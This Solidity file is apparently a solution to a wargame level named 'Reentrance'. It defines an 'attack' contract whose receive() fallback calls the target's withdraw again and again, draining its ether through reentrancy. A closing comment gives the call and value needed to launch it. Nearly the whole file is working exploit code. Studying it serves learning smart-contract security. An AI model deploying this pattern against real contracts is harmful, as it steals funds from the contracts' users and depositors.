// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "./reentrancy.sol";

contract attack{

    Reentrance public reentrance;
        uint targetValue = 0.001 ether;



// Creating instance of reentrance contract
    
   constructor(address payable  _targetAddr) public {
    reentrance = Reentrance(_targetAddr);
    }
    
function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(msg.value);
    }

receive() external payable {
       if(address(reentrance).balance>= 0.001 ether){
          reentrance.withdraw(targetValue);
       }
    }
    

}

// Now call donateAndWithdraw of attack with value of 1000000000000000 (0.001 ether)